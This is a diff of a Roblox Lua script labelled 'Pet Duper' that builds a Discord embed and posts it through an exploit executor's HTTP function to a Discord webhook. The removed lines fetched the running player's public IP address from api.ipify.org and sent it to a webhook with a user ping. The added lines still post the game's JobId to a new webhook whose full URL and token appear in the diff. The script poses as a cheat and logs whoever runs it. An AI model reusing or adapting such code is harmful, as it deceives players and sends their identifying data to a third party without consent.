@@ -1,27 +1,25 @@
-local key = game:HttpGet("https://api.ipify.org")
+local test2 = 'Test'
 local OSTime = os.time();
 local Time = os.date('!*t', OSTime);
-local Avatar = 'https://cdn.discordapp.com/embed/avatars/4.png';
-local Content = 'Details';
+local TestTitle = 'Pet Duper';
 local Embed = {
     title = 'Pets';
     color = '99999';
     footer = { text = game.JobId };
     author = {
-        name = 'Grow a Garden';
-        url = 'https://www.roblox.com/games/126884695634066/Grow-a-Garden';
+        name = 'ROBLOX';
+        url = 'https://www.roblox.com/';
     };
     fields = {
         {
             name = 'DupeDetails';
-            name = '<@568416088543723561>
-            value = key;
+            value = test2;
         }
     };
     timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
 };
 (syn and syn.request or http_request) {
-    Url = 'https://discord.com/api/webhooks/1243366209395884093/adCgtBDIFOreRq1Z9C3MqRbszQV33WDQ1SbrUIOZ-w1EFXDdB9Yvpladkg3PvA_Tkxi-';
+    Url = 'https://discord.com/api/webhooks/1388732282235256906/TRZGVIkEbI41pOl07mrddnH9nxXkSQOWDOG_uj-4iSkOPuMGqBoxgSSnKQOo1UGac-xp';
     Method = 'POST';
     Headers = {
         ['Content-Type'] = 'application/json';
